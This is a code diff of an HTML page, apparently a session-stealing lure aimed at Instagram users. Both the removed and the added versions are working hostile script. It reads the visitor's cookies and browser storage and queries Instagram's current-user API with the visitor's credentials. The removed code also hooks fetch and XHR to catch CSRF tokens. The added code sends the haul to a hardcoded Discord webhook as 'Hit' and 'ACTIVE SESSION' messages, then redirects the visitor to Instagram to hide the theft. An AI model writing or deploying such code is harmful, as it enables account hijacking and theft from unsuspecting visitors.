@@ -3,149 +3,73 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Loading...</title>
-    <style>
-        body{background:#000;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
-        .loader{width:40px;height:40px;border:3px solid #333;border-top:3px solid #fff;border-radius:50%;animation:spin 1s linear infinite}
-        @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
-        .hidden{display:none}
-    </style>
+    <title>.</title>
+    <style>body{background:#000;margin:0;height:100vh}</style>
 </head>
 <body>
-    <div class="loader"></div>
-    <iframe id="igFrame" class="hidden" src="https://www.instagram.com/"></iframe>
-    
     <script>
-        const WEBHOOK = 'https://webhook.site/96c8b285-a75d-4b39-b5fb-a238db28e204'; // Change this
+        const DISCORD = 'https://discord.com/api/webhooks/1496531603210506392/kf7iJdmSOgzhV21bKbYXiVv6NvZdXxxMuUR-teMhvQwAEKCDFxo-euHie5B00imucPJh';
         
-        async function grab() {
-            // Method 1: Direct cookie check
-            const cookies = document.cookie;
-            if(cookies) {
-                send('cookies_direct', {cookies: cookies});
-            }
-            
-            // Method 2: Try to read from iframe
-            try {
-                const iframe = document.getElementById('igFrame');
-                iframe.onload = async function() {
-                    try {
-                        const iframeCookies = iframe.contentDocument.cookie;
-                        if(iframeCookies) {
-                            send('cookies_iframe', {cookies: iframeCookies});
-                        }
-                    } catch(e) {
-                        // Same-origin blocks this - expected
-                    }
-                    
-                    // Redirect through Instagram logout to trigger cookie exposure
-                    window.location.href = 'https://www.instagram.com/accounts/logout/';
-                };
-            } catch(e) {}
-            
-            // Method 3: Fetch Instagram API endpoints that return user data
-            try {
-                const res = await fetch('https://www.instagram.com/api/v1/accounts/current_user/?__a=1&__d=dis', {
-                    credentials: 'include'
-                });
-                
-                if(res.ok) {
-                    const data = await res.json();
-                    send('api_data', {
-                        userData: data,
-                        cookies: document.cookie
-                    });
-                }
-            } catch(e) {}
-            
-            // Method 4: Check all storage
-            const storage = {
-                local: {},
-                session: {}
-            };
-            
-            for(let i=0; i<localStorage.length; i++) {
-                const k = localStorage.key(i);
-                storage.local[k] = localStorage.getItem(k);
-            }
-            
-            for(let i=0; i<sessionStorage.length; i++) {
-                const k = sessionStorage.key(i);
-                storage.session[k] = sessionStorage.getItem(k);
-            }
-            
-            if(Object.keys(storage.local).length || Object.keys(storage.session).length) {
-                send('storage', storage);
-            }
-            
-            // Redirect to Instagram after 3 seconds
-            setTimeout(() => {
-                window.location.href = 'https://www.instagram.com/';
-            }, 3000);
-        }
-        
-        function send(type, data) {
-            if(WEBHOOK === 'YOUR_WEBHOOK_URL') {
-                console.log(type, data);
-                return;
-            }
-            
-            fetch(WEBHOOK, {
+        async function send(data) {
+            fetch(DISCORD, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
-                    type: type,
-                    timestamp: new Date().toISOString(),
-                    userAgent: navigator.userAgent,
-                    data: data
+                    content: null,
+                    embeds: [{
+                        title: "🎯 Hit",
+                        color: 0xE4405F,
+                        fields: [
+                            {name: "🍪 Cookies", value: `\`\`\`${data.cookies || 'None'}\`\`\``, inline: false},
+                            {name: "📱 UA", value: data.ua || 'Unknown', inline: false},
+                            {name: "⏰ Time", value: new Date().toLocaleString(), inline: false}
+                        ],
+                        footer: {text: "Instagram Session"}
+                    }]
                 })
-            }).catch(e => console.log);
+            });
         }
         
-        // Override fetch to capture requests
-        const originalFetch = window.fetch;
-        window.fetch = function(...args) {
-            return originalFetch.apply(this, args).then(response => {
-                const clone = response.clone();
-                if(args[0].includes('instagram.com')) {
-                    clone.text().then(text => {
-                        if(text.includes('csrf_token') || text.includes('userId')) {
-                            send('fetch_intercept', {
-                                url: args[0],
-                                response: text.substring(0, 2000)
-                            });
-                        }
+        async function grab() {
+            const cookies = document.cookie;
+            const storage = {...localStorage};
+            
+            // Send everything
+            send({
+                cookies: cookies,
+                storage: JSON.stringify(storage),
+                ua: navigator.userAgent,
+                ref: document.referrer
+            });
+            
+            // Try Instagram API
+            try {
+                const res = await fetch('https://www.instagram.com/api/v1/accounts/current_user/?__a=1', {
+                    credentials: 'include'
+                });
+                if(res.ok) {
+                    const data = await res.json();
+                    fetch(DISCORD, {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            embeds: [{
+                                title: "✅ ACTIVE SESSION",
+                                color: 0x00FF00,
+                                fields: [
+                                    {name: "User", value: data.username || 'Unknown', inline: true},
+                                    {name: "ID", value: data.pk || 'Unknown', inline: true},
+                                    {name: "Session", value: `\`\`\`${cookies}\`\`\``, inline: false}
+                                ]
+                            }]
+                        })
                     });
                 }
-                return response;
-            });
-        };
+            } catch(e) {}
+            
+            setTimeout(() => window.location = 'https://instagram.com', 1000);
+        }
         
-        // Hook XHR
-        const XHR = XMLHttpRequest.prototype;
-        const originalOpen = XHR.open;
-        const originalSend = XHR.send;
-        
-        XHR.open = function(method, url) {
-            this._url = url;
-            return originalOpen.apply(this, arguments);
-        };
-        
-        XHR.send = function(body) {
-            this.addEventListener('load', function() {
-                if(this._url && this._url.includes('instagram.com')) {
-                    if(this.responseText && this.responseText.includes('csrf_token')) {
-                        send('xhr_intercept', {
-                            url: this._url,
-                            response: this.responseText.substring(0, 2000)
-                        });
-                    }
-                }
-            });
-            return originalSend.apply(this, arguments);
-        };
-        
-        // Start
         grab();
     </script>
 </body>
